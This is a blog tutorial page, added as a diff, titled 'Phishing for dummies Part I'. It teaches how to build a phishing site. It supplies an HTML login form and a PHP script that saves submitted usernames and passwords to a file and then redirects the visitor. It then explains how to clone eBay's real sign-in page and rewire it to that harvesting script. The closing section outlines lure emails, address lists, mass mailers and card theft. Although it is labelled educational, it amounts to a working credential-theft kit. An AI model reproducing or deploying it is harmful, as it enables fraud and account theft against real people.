@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>tzekid | Phishing for dummies Part I</title>
+  <style>
+    @font-face {
+      font-family: 'Josefin Sans';
+      font-style: normal;
+      font-weight: 400;
+      src: local('Josefin Sans'), local('JosefinSans'), url(https://fonts.gstatic.com/s/josefinsans/v9/xgzbb53t8j-Mo-vYa23n5j0LW-43aMEzIO6XUTLjad8.woff2) format('woff2');
+      unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
+    }
+    @font-face {
+      font-family: 'Josefin Sans';
+      font-style: normal;
+      font-weight: 400;
+      src: local('Josefin Sans'), local('JosefinSans'), url(https://fonts.gstatic.com/s/josefinsans/v9/xgzbb53t8j-Mo-vYa23n5ugdm0LZdjqr5-oayXSOefg.woff2) format('woff2');
+      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;
+    }
+    @font-face {
+      font-family: 'Quando';
+      font-style: normal;
+      font-weight: 400;
+      src: local('Quando-Regular'), url(https://fonts.gstatic.com/s/quando/v5/Oeohr3r1MT36PpT5mWulufesZW2xOQ-xsNqO47m55DA.woff2) format('woff2');
+      unicode-range: U+0100-024F, U+1E00-1EFF, U+20A0-20AB, U+20AD-20CF, U+2C60-2C7F, U+A720-A7FF;
+    }
+    @font-face {
+      font-family: 'Quando';
+      font-style: normal;
+      font-weight: 400;
+      src: local('Quando-Regular'), url(https://fonts.gstatic.com/s/quando/v5/PH1InQe0rvp_yN3TzIuyyQ.woff2) format('woff2');
+      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215;
+    }
+    
+  </style>
+  <link rel="stylesheet" href="../normalize.min.css">
+  <link rel="stylesheet" href="../stylez.css">
+  <link rel="stylesheet" href="../highlight-default.min.css">
+</head>
+<body>
+  <header></header>
+  <div class="art_head"><a class="art_title" href="/">
+      <h1 class="logo quando red art_logo"><{ tzekid }></h1></a></div>
+  <article class="josefin">
+    <div class="markdown"><h1>Phishing for dummies, Part I</h1>
+<h2>Why | Prologue</h2>
+<p>– placeholder –</p>
+<h2>What</h2>
+<p>This article is meant for beginners or beginning types, so if you already know a bit of HTML and PHP, then this article might be a tad boring. In this article I’ll go through the first module I’ve made for the school group, namely:</p>
+<ul>
+<li>building a simple forms website</li>
+<li>setting up a simple server</li>
+<li>writing a server-side script which
+<ul>
+<li>takes request parameters</li>
+<li>writes a log locally,</li>
+<li>and finally redirects the user to a new page</li>
+</ul>
+</li>
+</ul>
+<p>and, hopefully</p>
+<ul>
+<li>show you a practical, 100% educational, real world example.</li>
+</ul>
+<h2>The Site</h2>
+<p>The code for the site is very basic:</p>
+<pre><code class="highlight-html">&lt;!doctype html&gt;
+&lt;meta charset=&quot;UTF-8&quot;&gt;
+
+&lt;form action=&quot;./script.php&quot; method='get'&gt;
+    &lt;p&gt;User:    &lt;input name=&quot;user&quot; type='text'&gt;&lt;/p&gt;
+    &lt;p&gt;Pwd :    &lt;input name=&quot;pwd&quot;  type='password'&gt;&lt;/p&gt;
+    &lt;center&gt;    &lt;input type=&quot;submit&quot;&gt;&lt;/center&gt;
+&lt;/form&gt;
+
+&lt;style&gt;
+    form {
+        position : absolute;
+        top : 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+    }
+&lt;/style&gt;
+</code></pre>
+<p>There is all we need. Let’s go through the code. The <code>doctype</code> tag is mostly there to show all browsers that the ‘document’ we’re giving them is actually just plain html. You can read more about the <code>doctype</code> and <code>meta</code> tags <a href="https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/HTML5/Introduction_to_HTML5">here</a>.</p>
+<p>Now, the meat of the site is in the next <code>form</code> tag. This tag is made up of many smaller inputs which, when submitted, are usually compiled down to JSON - a protocol which makes the sharing of (objects and) variables universal.</p>
+<p><input id="elif" type="checkbox" /><label for="elif"> There is a <a href="https://www.reddit.com/r/explainlikeimfive/comments/2m2pb2/eli5what_is_json/cm0e4c2/" target="_blank">very neat ELIF</a> on the topic, if you want to know more.</label></p>
+<p>We give the <code>form</code> tag an <code>action</code> argumen. This is <em>where</em> the information will be submitted, ie. in our case that we submit the form information to a local file named <code>script.php</code>. The next argument, <code>method</code>, describes <em>how</em> the information will be transfered. You can read more about it on the <a href="https://developer.mozilla.org/en-US/docs/Learn/HTML/Forms/Sending_and_retrieving_form_data">MDN web docs</a>.</p>
+<p>You can see the <code>name</code> attribute in the <code>input</code>, alongsite the <code>type</code> tag. The <code>type</code> tag tells the browser how to present the input field. In our example we need one field for the <code>user</code>name, which consists of text, and one for the <code>p</code>ass<code>w</code>or<code>d</code>, which should be hidden by asterisks.</p>
+<p>For each form we need a thing which actually <code>submit</code>s the data.</p>
+<p>Upon submitting the form, we send the information in form of JSON. The JSON for someone with the user ‘derek’ and password ‘peanuts12’ simply looks like:</p>
+<pre><code class="highlight-JSON">{
+    &quot;user&quot;: &quot;derek&quot;,
+    &quot;password&quot;: &quot;peanuts12&quot;
+}
+</code></pre>
+<p>To all of that we just have some <code>p</code>aragraph, <code>center</code> and <code>style</code> tags, alongside a bit of CSS centering the login form, making everything just a bit more tidy and pleasant to look at.</p>
+<p>Here is how the ‘final product’ should look like:
+<img src="/resources/on-phishing_dummy-site.png" alt="the butterfull dummy site"></p>
+<h2>The Server</h2>
+<p>The next thing we need is a server, ie. a way to run the HTML and PHP code.</p>
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th style="text-align:right">TL:DR</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Arch Linux</td>
+<td style="text-align:right"><code># pacman -S php</code></td>
+</tr>
+<tr>
+<td>Ubuntu</td>
+<td style="text-align:right"><code># apt-get install php</code></td>
+</tr>
+<tr>
+<td>macOS</td>
+<td style="text-align:right">have a look at <a href="https://lukearmstrong.github.io/2016/12/setup-apache-mysql-php-homebrew-macos-sierra/">this article</a></td>
+</tr>
+<tr>
+<td>Windows</td>
+<td style="text-align:right">install <a href="https://www.apachefriends.org/index.html?ModPagespeed=noscript">XAMPP</a></td>
+</tr>
+</tbody>
+</table>
+<p>Running the php server:</p>
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th style="text-align:right">TL:DR</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Windows’ CMD</td>
+<td style="text-align:right"><code>&gt; c:\xampp\php\php.exe -S localhost:8080</code></td>
+</tr>
+<tr>
+<td>'nux and mac</td>
+<td style="text-align:right"><code>$ php -S localhost:8080</code></td>
+</tr>
+</tbody>
+</table>
+<p>Now, in your browser, just go to the <code>localhost:8080</code> address, and you should see the magnificent login form from before.</p>
+<h2>The Script</h2>
+<p>Now it’s time to write the script file which will handle the input. Create a <code>script.php</code> file in the same directory as <code>index.html</code>.</p>
+<p>This is the code for the <code>script.php</code>:</p>
+<pre><code class="highlight-php">&lt;?php
+    /* Catch input */
+    $user = $_REQUEST[&quot;user&quot;];
+    $pwd  = $_REQUEST[&quot;pwd&quot;];
+
+    /* Formating input */
+    $text = &quot;
+===============
+user: $user
+pwd : $pwd
+===============
+&quot;;
+
+    /* Write to file */
+    $file = fopen(&quot;output.txt&quot;, &quot;a+&quot;);
+    fwrite($file, $text);
+    fclose($file);
+
+    /* If writing doesn't work, make sure   *
+    /* script.php has permission to WRITE.  */
+
+    /* Redirecting the User */
+    $url = &quot;https://google.com&quot;;
+    header('Location: '.$url);
+?&gt;
+</code></pre>
+<p>Now, let’s analyse this script a bit. The PHP files are distingueshed from the HTML code by the special <code>php</code> tag. What we first want to do is catch or handle the input we got from our <code>index.html</code> file. We do that with the help of <code>$_REQUEST</code>. We catch the element with the name <code>user</code> and save it’s value in the variable <code>$user</code>, and ditto for the password. You see that PHP has the <code>$</code> symbol for variables, which distiguishes them from functions or arrays.</p>
+<p>After that we create a simply formatted <code>$text</code> entry for the login information we got, using the variables as placeholders.</p>
+<p>In the output file it would be nice to be able to easily read and go through the login credentials, that’s why we first format the input we catched into a nice and tidy string. In the ‘real world’ there are a couple more variables you store, like the date and time, the ip, from which spam ‘campaign’ the <s>sucker</s> user was phished, sometimes credit card info etc. Therefore keeping tidy is very important, especially when you have hundreds (or thousands) of entries.</p>
+<p>We need a file in which we save the output. We use <code>fopen</code> to open a file, giving it <code>output.txt</code> as the filename and <code>a+</code> as the mode - <code>a+</code> opens the file for both reading and writing, and if the file does not exist it attempts to create it. We then <code>fwrite</code> our formatted <code>$text</code> to the <code>$file</code>, and then <code>fclose</code> it.</p>
+<p>In the last bit of the sript we change the <code>Location</code> of the page to our desired <code>$url</code>. ( The dot, <code>.</code>, is for concatenating, ie. gluing two character strings in php. )</p>
+<h2>Practical Example</h2>
+<p>Congratulations ! You now have a very basic ‘phishing’ site !</p>
+<p>But noone in their right mind would enter their login information on that site. For educational purposes we’ll try our hands at a more practical, or better said realistic example … how about Ebay ? That sounds pretty reasonable, right ?</p>
+<p><input id="example" type="checkbox" /><label for="example"> Just go on <a href="https://signin.ebay.com/" target="_blank">the ebay signin page</a> and hit <code>Ctrl</code>+<code>S</code>.</label></p>
+<p>For the file to work nicely with our local php ‘server’ you can rename the downloaded <code>.html</code> file to <code>index.html</code>, and make sure it is the only index file in the directory not to get php all too confused.</p>
+<p>After opening the file in both my browser and editor it all looked allright besides some not so nice text bits that were just out of place in the middle of the page.</p>
+<p><img src="/resources/on-phishing_ebay.png" alt="sample ebay website"></p>
+<p>All that I had to do was to clean that up by deleting those exact lines. If you take a look at the source code you’ll see it’s a mess, so take care not to delete stuff which we actually need !</p>
+<p>Now that the site looks clean, especially with the addition of the ‘Norton SECURED’ logo, we need to dive in the source code. What we actually want to accomplish doesn’t differ that much from our toy example from before. The ebay login site has a <code>form</code> with some <code>action</code> and <code>method</code> arguments, among many others. In this form there are a bunch of inputs, each with their specific <code>name</code>s and <code>type</code>s, again, amongst many other values.</p>
+<p>All we need to to is to find those fields ! I for one just searched for ‘email or username’ in the form and got three results, two <code>label</code> tags and the actual <code>input</code> tag we’re looking for ! Ditto for the password <code>input</code>.</p>
+<pre><code class="highlight-html">  ...
+  &lt;input size=&quot;40&quot; ... name=&quot;856774662&quot; ... placeholder=&quot;Email or username&quot; ...&gt;
+  ...
+  &lt;input name=&quot;pass&quot; ... type=&quot;password&quot; ... placeholder=&quot;Password&quot;&gt;
+  ...
+</code></pre>
+<p>It’s <code>name</code>s should differ for you, but that’s no problem. Just change the <code>name</code> attribute to ‘user’ for the username and 'pwd` for the password input.</p>
+<p>We still have to change <em>where</em> the form is submitting the login information. You can easily find it by searching for ‘&lt;form’.</p>
+<pre><code class="highlight-html">  &lt;form name=&quot;SignInForm&quot; ... method=&quot;post&quot; ... action=&quot;.../nautlissignin.ebay.com/...&quot;&gt;
+</code></pre>
+<p>There you only have to change the <code>action</code> to our creatively named script, <code>script.php</code>. And as the cherry on top, to make it all a bit more authentic: in the <code>script.php</code> change <code>$url</code> either to the original <code>https://signin.ebay.com</code>, to their policy page, or anything that your heart desires.</p>
+<p>And voila, you’re done! You can now test your fully functioning phishing page!</p>
+<p>In a real world scenario one would then make a so called letter, an email website usually just ripping their own by making simple request, eg. the ‘forgot my password’ or other support email. Another thing one needs is a list of (valid!) emails and a mass mailer programm. Scammers wouldn’t stop at getting your ebay login credentials, but do their best to get your paypal or (credit) card info. too, either adding an extra page to the login one or ‘spear phishing’, ie. a coordinated attack tailered just for you :)</p>
+
+    </div>
+  </article><a class="go_back quando red" href="./index.html"><{ index }></a>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: { inlineMath: [['$', '$'], ['\\(', '\\)']] }
+    });
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS_HTML-full"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad();
+    
+  </script>
+  <footer></footer>
+</body>
